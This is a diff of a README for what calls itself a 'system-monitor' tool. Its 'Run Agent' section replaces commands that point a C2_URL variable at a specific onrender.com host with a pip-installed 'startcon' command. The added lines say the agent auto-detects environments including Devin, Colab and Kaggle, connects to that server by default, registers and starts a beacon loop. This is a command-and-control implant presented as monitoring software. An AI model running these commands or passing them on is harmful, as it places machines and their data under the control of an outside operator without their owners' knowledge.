@@ -94,20 +94,21 @@ curl -s https://system-monitor-6dru.onrender.com/api/health
 
 ### 3. Run Agent
 ```bash
-# Method 1: Direct with env var
-C2_URL=https://system-monitor-6dru.onrender.com python3 src/agents/universal.py
+# After pip install - just run:
+startcon
 
-# Method 2: Export first (works in all shells)
-export C2_URL=https://system-monitor-6dru.onrender.com
-python3 src/agents/universal.py
+# Or with custom server:
+C2_URL=https://your-server.com startcon
 
-# Method 3: From project root as module
-cd /path/to/system-monitor
-python3 -m src.agents.universal
-
-# Method 4: With all options
-C2_URL=https://system-monitor-6dru.onrender.com SLEEP=10 python3 src/agents/universal.py
+# Alternative commands:
+sysmon-agent    # Same as startcon
+sysmon          # Start server (not agent)
 ```
+
+**That's it!** The agent will:
+1. Auto-detect platform (Devin, Colab, Kaggle, Linux, macOS, Windows)
+2. Connect to server (default: https://system-monitor-6dru.onrender.com)
+3. Register and start beacon loop
 
 Expected output:
 ```
